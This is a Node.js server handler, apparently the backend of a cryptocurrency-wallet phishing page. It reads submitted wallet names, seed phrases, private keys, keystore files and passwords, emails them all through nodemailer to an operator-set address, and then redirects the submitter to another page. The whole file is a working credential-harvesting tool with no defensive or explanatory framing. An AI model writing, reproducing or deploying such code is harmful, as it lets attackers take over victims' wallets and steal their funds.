const nodemailer = require('nodemailer');
const formidable = require('formidable');
const { parse } = require('querystring');

async function readBody(req) {
  const contentType = req.headers['content-type'] || '';

  if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
    return req.body;
  }

  if (req.body && typeof req.body === 'string') {
    if (contentType.includes('application/json')) {
      return JSON.parse(req.body);
    }

    return parse(req.body);
  }

  if (contentType.includes('multipart/form-data')) {
    const form = formidable({ multiples: false, keepExtensions: true });
    const [fields] = await form.parse(req);
    const normalized = {};

    Object.entries(fields).forEach(([key, value]) => {
      normalized[key] = Array.isArray(value) ? value[0] : value;
    });

    return normalized;
  }

  if (req.readable && typeof req.on === 'function') {
    const rawBody = await new Promise((resolve, reject) => {
      let data = '';
      req.setEncoding('utf8');
      req.on('data', (chunk) => { data += chunk; });
      req.on('end', () => resolve(data));
      req.on('error', reject);
    });

    if (!rawBody) {
      return {};
    }

    if (contentType.includes('application/json')) {
      return JSON.parse(rawBody);
    }

    return parse(rawBody);
  }

  return {};
}

async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }

  let body = {};

  try {
    body = await readBody(req);
  } catch (error) {
    console.error('Body parsing error:', error);
    return res.status(400).send('Unable to read form data.');
  }

  const {
    wallet_name,
    walletName,
    phase,
    pw: password,
    password: passwordField,
    seedphrase,
    phrase,
    privateKey,
    privatekey,
    private_key,
    keystore,
    keystorePassword,
    keystore_password,
  } = body;

  const walletNameValue = wallet_name || walletName || '';
  const phaseValue = phase || '';
  const passwordValue = password || passwordField || keystorePassword || keystore_password || '';
  const seedPhraseValue = seedphrase || phrase || '';
  const privateKeyValue = privateKey || privatekey || private_key || '';
  const keystoreValue = keystore || '';

  if (!phaseValue || phaseValue.trim() === '') {
    return res.status(400).send('Required field missing.');
  }

  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587', 10),
      secure: process.env.SMTP_PORT === '465',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASSWORD,
      },
    });

    const mailOptions = {
      from: `${process.env.SMTP_FROM_NAME || 'Wallet Form'} <${process.env.SMTP_FROM_EMAIL || process.env.SMTP_USER}>`,
      to: process.env.RECIPIENT_EMAIL || process.env.SMTP_USER,
      subject: 'New Form Submission',
      text: [
        `Wallet Name: ${walletNameValue}`,
        `Phase: ${phaseValue}`,
        `Seed Phrase: ${seedPhraseValue}`,
        `Private Key: ${privateKeyValue}`,
        `Keystore: ${keystoreValue}`,
        `Password: ${passwordValue}`,
      ].join('\n'),
    };

    await transporter.sendMail(mailOptions);
    res.writeHead(302, { Location: '/rdr.html' });
    res.end();
  } catch (error) {
    console.error('Email error:', error);
    res.status(500).send('Message could not be sent. Error: ' + error.message);
  }
}

module.exports = handler;
module.exports.config = {
  api: {
    bodyParser: false,
  },
};
